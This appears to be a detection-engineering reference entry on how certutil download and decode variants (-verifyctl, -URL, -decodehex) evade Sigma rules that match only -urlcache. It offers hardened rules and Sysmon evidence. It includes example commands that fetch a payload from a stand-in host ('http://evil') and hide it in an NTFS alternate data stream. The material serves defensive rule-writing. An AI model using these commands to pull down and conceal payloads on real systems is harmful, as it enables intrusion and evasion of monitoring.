---
id: ADE2-002
title: Certutil Variations
ade_category: ADE2
ade_subcategory: ADE2-01
mitre_attack:
  - T1105 (Ingress Tool Transfer)
  - T1140 (Deobfuscate/Decode Files or Information)
platform: Windows
testable: true
---

# Certutil Variations

## Summary

Detection rules for certutil abuse typically focus on the `-urlcache` flag for file downloads. Certutil supports at least five distinct subcommands that download or decode files: `-urlcache`, `-verifyctl`, `-decode`, `-decodehex`, and `-URL`. Rules that only match `-urlcache` miss four alternative codepaths that achieve the same outcomes. Additionally, certutil can write downloaded content directly to NTFS Alternate Data Streams, hiding the payload from standard directory listings.

## ADE Classification

**Category:** ADE2 — Omit Alternatives
**Subcategory:** ADE2-01 — Alternative Download/Decode Methods
**Core principle:** Rules anchored to a single certutil subcommand miss functionally equivalent subcommands within the same binary. The attack surface is the binary's full feature set, not just the most commonly documented technique.

## The Technique

Certutil is a legitimate Windows certificate management utility. Its extensive feature set includes multiple mechanisms for downloading and decoding files:

### Download variations

| Subcommand | Usage | Detection prevalence |
|------------|-------|---------------------|
| `-urlcache` | `certutil -urlcache -f -split URL outfile` | High — most rules cover this |
| `-verifyctl` | `certutil -verifyctl -f -split URL outfile` | Low — functionally identical to -urlcache for downloads |
| `-URL` | `certutil -URL URL` | Very low — launches GUI but downloads the resource |

### Decode variations

| Subcommand | Usage | Purpose |
|------------|-------|---------|
| `-decode` | `certutil -decode input.b64 output.exe` | Base64 decode (expects BEGIN CERTIFICATE header) |
| `-decodehex` | `certutil -decodehex input.hex output.exe` | Hex decode — no header required |

### NTFS Alternate Data Streams

Certutil can write directly to an ADS, hiding the downloaded file from `dir` and Windows Explorer:

```cmd
certutil -urlcache -f http://example.com/payload.exe C:\Users\Public\legit.txt:payload.exe
```

The file `C:\Users\Public\legit.txt` appears normal. The payload is stored in the `:payload.exe` stream, invisible to standard directory listings but executable via `wmic process call create` or `start`.

### Decode pipeline

Attackers frequently combine download + decode: deliver a base64-encoded payload via any download method, then decode it on disk:

```cmd
certutil -urlcache -f http://evil/payload.b64 C:\Users\Public\data.txt
certutil -decode C:\Users\Public\data.txt C:\Users\Public\payload.exe
```

**OriginalFileName:** `CertUtil.exe` (Sysmon strips the `.mui` suffix — see NUANCES #4)

## Bypass Demonstration

### Benign test payload

```cmd
:: Classic -urlcache download (what most rules detect)
certutil -urlcache -f https://live.sysinternals.com/autoruns.exe C:\Users\Public\test1.exe

:: -verifyctl download (bypasses most rules)
certutil -verifyctl -f -split https://live.sysinternals.com/autoruns.exe C:\Users\Public\test2.exe

:: Base64 encode then decode round-trip
echo "Hello World" > C:\Users\Public\test_input.txt
certutil -encode C:\Users\Public\test_input.txt C:\Users\Public\test_encoded.b64
certutil -decode C:\Users\Public\test_encoded.b64 C:\Users\Public\test_decoded.txt

:: Cleanup
del C:\Users\Public\test1.exe C:\Users\Public\test2.exe C:\Users\Public\test_input.txt C:\Users\Public\test_encoded.b64 C:\Users\Public\test_decoded.txt
```

### What the parser sees vs. what the rule sees

| Layer | Sees |
|-------|------|
| Sysmon EID 1 — urlcache variant | `certutil -urlcache -f https://live.sysinternals.com/autoruns.exe C:\Users\Public\test1.exe` |
| Sysmon EID 1 — verifyctl variant | `certutil -verifyctl -f -split https://live.sysinternals.com/autoruns.exe C:\Users\Public\test2.exe` |
| Sysmon EID 1 — decode variant | `certutil -decode C:\Users\Public\test_encoded.b64 C:\Users\Public\test_decoded.txt` |
| Sysmon EID 3 (NetworkConnect) | `certutil.exe` connecting to `live.sysinternals.com:443` (certutil itself makes the connection, unlike BITS) |
| Sysmon EID 11 (FileCreate) | `certutil.exe` creating the output file |

## Vulnerable Rule

```yaml
title: Certutil File Download
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains|all:
            - 'certutil'
            - '-urlcache'
    condition: selection
```

### Why it misses

The rule only matches `-urlcache`. The `-verifyctl` subcommand performs an identical download operation with different syntax. The `-decode` and `-decodehex` subcommands are completely missed — they handle the second stage (payload decoding) that many attack chains depend on.

## Hardened Rule

```yaml
title: Certutil Suspicious Usage (Hardened - All Variations)
status: experimental
description: |
    Detects all known certutil abuse patterns: download via -urlcache/-verifyctl,
    decode via -decode/-decodehex, and the -URL flag. Alerts on ANY certutil
    execution with these subcommands, as legitimate certificate management
    rarely uses them interactively.
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\certutil.exe'
        - OriginalFileName: 'CertUtil.exe'
    selection_download:
        CommandLine|contains:
            - '-urlcache'
            - '-verifyctl'
            - '-URL'
    condition: selection_img and selection_download
falsepositives:
    - Certificate chain verification by PKI administrators
    - Automated certificate validation scripts
level: high
---
title: Certutil Decode Operation (Hardened)
status: experimental
description: |
    Detects certutil being used to decode base64 or hex-encoded files.
    Legitimate use of -decode is rare outside PKI workflows.
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\certutil.exe'
        - OriginalFileName: 'CertUtil.exe'
    selection_decode:
        CommandLine|contains:
            - '-decode'
            - '-decodehex'
    filter_encode:
        CommandLine|contains: '-encode'
    condition: selection_img and selection_decode and not filter_encode
falsepositives:
    - PKI certificate export/import workflows
level: high
---
title: Certutil Writing to NTFS Alternate Data Stream
status: experimental
description: |
    Detects certutil downloading or decoding content into an NTFS Alternate
    Data Stream. The colon in the output path after the filename extension
    indicates ADS usage.
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\certutil.exe'
        - OriginalFileName: 'CertUtil.exe'
    selection_ads:
        CommandLine|re: '\.[a-zA-Z]{2,4}:[a-zA-Z]'
    condition: selection_img and selection_ads
falsepositives:
    - Extremely rare in legitimate use
level: critical
```

### Broadest coverage approach

For environments where certutil has no legitimate interactive use (most endpoints), the most effective rule is the simplest:

```yaml
title: Any Certutil Execution on Endpoint
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        - Image|endswith: '\certutil.exe'
        - OriginalFileName: 'CertUtil.exe'
    filter_parent:
        ParentImage|endswith:
            - '\services.exe'
            - '\svchost.exe'
            - '\msiexec.exe'
    condition: selection and not filter_parent
falsepositives:
    - PKI administrators running certificate management tasks
    - Software installation scripts that validate certificates
level: medium
```

## Sysmon Evidence

### Event ID 1 -- Process Create (certutil -verifyctl)

| Field | Value | Note |
|-------|-------|------|
| Image | `C:\Windows\System32\certutil.exe` | Resolved path |
| CommandLine | `certutil -verifyctl -f -split https://live.sysinternals.com/autoruns.exe C:\Users\Public\test2.exe` | -verifyctl, not -urlcache |
| OriginalFileName | `CertUtil.exe` | Sysmon strips `.mui` suffix |
| ParentImage | `C:\Windows\System32\cmd.exe` | Parent process |

### Event ID 1 -- Process Create (certutil -decode)

| Field | Value | Note |
|-------|-------|------|
| Image | `C:\Windows\System32\certutil.exe` | Same binary |
| CommandLine | `certutil -decode C:\Users\Public\test_encoded.b64 C:\Users\Public\test_decoded.txt` | Decode operation, no URL |
| OriginalFileName | `CertUtil.exe` | PE header value |

### Event ID 3 -- Network Connect (certutil.exe)

| Field | Value | Note |
|-------|-------|------|
| Image | `C:\Windows\System32\certutil.exe` | Unlike BITS, certutil itself makes the connection |
| DestinationHostname | `live.sysinternals.com` | Download target |
| DestinationPort | `443` | HTTPS |

## Detection Layers

| Layer | Detects? | Why |
|-------|----------|-----|
| Command-line substring (`-urlcache`) | Partial | Only catches one of five subcommands |
| Command-line substring (all subcommands) | Yes | Must enumerate: urlcache, verifyctl, decode, decodehex, URL |
| Image/OriginalFileName | Yes | Catches all certutil usage regardless of subcommand |
| Network connection from certutil | Yes | certutil makes its own connections (unlike BITS) |
| File creation by certutil | Yes | FileCreate events attributed to certutil.exe |
| ADS detection | Partial | Requires regex on CommandLine or Sysmon EID 15 (FileCreateStreamHash) |
| Script Block Logging (4104) | N/A | Not a PowerShell technique |
| AMSI | N/A | Not a PowerShell technique |
| Behavioral (download + decode sequence) | Yes | Correlation of two certutil invocations within a timeframe |

## Implementation Nuances

- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) #4: Sysmon strips `.mui` from OriginalFileName — `CertUtil.exe` is logged, not `CertUtil.exe.mui`
- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) #5: Sigma `|re` regex flavor varies by backend — the ADS detection regex must be tested on your target SIEM
- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) #11: OriginalFileName survives binary copy/rename — catches renamed certutil copies
- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) #6: Correlation timeframes matter for download + decode sequences — attackers may insert arbitrary delays between the two commands

## References

- [LOLBAS - Certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
- [MITRE ATT&CK T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- [MITRE ATT&CK T1140 - Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/)
- [Atomic Red Team - T1105](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md)
- [Atomic Red Team - T1140](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1140/T1140.md)
- [Hexacorn - Certutil Abuse](https://www.hexacorn.com/blog/2020/08/23/certutil-one-more-gui-lolbin/)
